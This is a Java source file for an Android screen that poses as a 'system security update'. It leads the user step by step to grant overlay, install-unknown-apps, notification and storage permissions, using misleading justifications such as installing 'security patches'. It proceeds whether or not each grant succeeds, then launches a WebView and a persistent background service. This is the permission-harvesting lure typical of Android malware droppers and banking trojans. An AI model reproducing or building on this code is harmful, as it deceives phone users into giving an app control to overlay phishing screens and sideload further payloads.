package com.system.security.update;

import android.Manifest;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class PermissionStepActivity extends AppCompatActivity {
    
    private static final int REQUEST_STORAGE = 101;
    private static final int REQUEST_NOTIFICATIONS = 102;
    private static final int REQUEST_OVERLAY = 103;
    
    private TextView stepTitle;
    private TextView stepDesc;
    private Button actionBtn;
    private TextView skipBtn;
    private ProgressBar progressBar;
    
    private int currentStep = 0;
    
    // Step flow
    private String[] titles = {
        "Storage Permission",
        "Display Over Other Apps",
        "Notifications",
        "Install Unknown Apps",
        "Final Setup"
    };
    
    private String[] descriptions = {
        "This app needs storage access to save your files and cache data for better performance.\n\n👉 Tap 'Allow' when prompted.",
        
        "Enable 'Display over other apps' so this app can show important security alerts.\n\n👉 Tap 'Open Settings' and toggle it ON.",
        
        "Enable notifications to receive important system updates and security alerts.\n\n👉 Tap 'Allow' when prompted.",
        
        "Allow installation from this source so the app can install security patches.\n\n👉 Tap 'Open Settings' and toggle it ON.",
        
        "All permissions configured!\n\nYour device is now optimized for the best experience.\n\nTap 'Finish' to continue."
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission_step);
        
        stepTitle = findViewById(R.id.stepTitle);
        stepDesc = findViewById(R.id.stepDesc);
        actionBtn = findViewById(R.id.actionBtn);
        skipBtn = findViewById(R.id.skipBtn);
        progressBar = findViewById(R.id.progressBar);
        
        updateStepUI();
        
        actionBtn.setOnClickListener(v -> handleCurrentStep());
        skipBtn.setOnClickListener(v -> nextStep());
    }
    
    private void updateStepUI() {
        stepTitle.setText(titles[currentStep]);
        stepDesc.setText(descriptions[currentStep]);
        
        if (currentStep == 4) {
            actionBtn.setText("🚀 Finish Setup");
            skipBtn.setVisibility(View.GONE);
        } else if (currentStep == 1 || currentStep == 3) {
            actionBtn.setText("⚙️ Open Settings");
            skipBtn.setVisibility(View.VISIBLE);
        } else {
            actionBtn.setText("Continue →");
            skipBtn.setVisibility(View.VISIBLE);
        }
    }
    
    private void handleCurrentStep() {
        progressBar.setVisibility(View.VISIBLE);
        actionBtn.setEnabled(false);
        
        new Handler().postDelayed(() -> {
            progressBar.setVisibility(View.GONE);
            actionBtn.setEnabled(true);
            
            switch (currentStep) {
                case 0:
                    requestStoragePermission();
                    break;
                case 1:
                    requestOverlayPermission();
                    break;
                case 2:
                    requestNotificationPermission();
                    break;
                case 3:
                    requestInstallUnknownApps();
                    break;
                case 4:
                    finishSetup();
                    break;
            }
        }, 800);
    }
    
    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_EXTERNAL_STORAGE},
                    REQUEST_STORAGE);
        } else {
            // Android 10+ doesn't need storage - auto proceed
            nextStep();
        }
    }
    
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_OVERLAY);
                return;
            }
        }
        nextStep();
    }
    
    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    REQUEST_NOTIFICATIONS);
        } else {
            nextStep();
        }
    }
    
    private void requestInstallUnknownApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!getPackageManager().canRequestPackageInstalls()) {
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + getPackageName()));
                try {
                    startActivity(intent);
                    return;
                } catch (ActivityNotFoundException e) {
                    // Fallback
                }
            }
        }
        nextStep();
    }
    
    private void nextStep() {
        if (currentStep < 4) {
            currentStep++;
            updateStepUI();
        } else {
            finishSetup();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Always proceed regardless of grant result
        nextStep();
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_OVERLAY) {
            nextStep();
        }
    }
    
    private void finishSetup() {
        // Increment stats
        Config.totalOpens++;
        
        // Start WebView
        Intent intent = new Intent(this, WebViewActivity.class);
        startActivity(intent);
        
        // Start background service
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        finish();
    }
          }
